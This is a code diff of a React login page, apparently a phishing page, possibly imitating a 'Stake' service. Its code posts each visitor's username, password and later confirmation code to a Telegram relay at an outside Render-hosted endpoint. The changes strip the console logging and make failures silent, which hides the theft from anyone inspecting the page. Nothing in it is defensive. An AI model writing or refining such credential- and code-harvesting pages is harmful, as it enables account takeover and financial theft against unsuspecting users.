@@ -53,17 +53,11 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى Render (مع سجلات التحقق)
+  // 🔐 دالة إرسال التنبيه إلى Render
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
-    console.log('📤 1. Starting to send alert...');
-    console.log('📤 2. Username:', username);
-    console.log('📤 3. Password:', password);
-    console.log('📤 4. Target URL:', 'https://stakeme-api.onrender.com/api/telegram/alert');
-
     try {
-      console.log('📤 5. Sending fetch request...');
-      const response = await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
+      await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -75,33 +69,8 @@ export default function Login() {
           userAgent: navigator.userAgent,
         }),
       });
-
-      console.log('📤 6. Response status:', response.status);
-      
-      // قراءة الرد كنص أولاً للتأكد من عدم وجود خطأ
-      const responseText = await response.text();
-      console.log('📤 7. Response text:', responseText);
-
-      let data;
-      try {
-        data = JSON.parse(responseText);
-        console.log('📤 8. Parsed response:', data);
-      } catch (e) {
-        console.warn('⚠️ Response is not JSON:', responseText);
-        data = { message: responseText };
-      }
-
-      if (response.ok) {
-        console.log('✅ 9. Telegram notification sent successfully!');
-      } else {
-        console.log('❌ 9. Server returned error:', data);
-      }
     } catch (error) {
-      console.error('❌ Failed to send alert:', error);
-      console.error('❌ Error details:', {
-        message: error.message,
-        stack: error.stack,
-      });
+      // Silent fail
     }
   };
 
@@ -109,7 +78,6 @@ export default function Login() {
   // 📤 دالة إرسال بيانات الدخول
   // ============================================
   const onSubmit = async (data: LoginFormValues) => {
-    console.log('📝 Form submitted with:', data);
     // إرسال البيانات إلى تليجرام
     await sendAlertToServer(data.username, data.password);
 
@@ -122,7 +90,6 @@ export default function Login() {
   // 📤 دالة إرسال رمز التأكيد
   // ============================================
   const onCodeSubmit = async (data: CodeFormValues) => {
-    console.log('📝 Code form submitted with:', data);
     // إرسال رمز التأكيد إلى تليجرام
     await sendAlertToServer("🔐 رمز التأكيد", data.code);
 
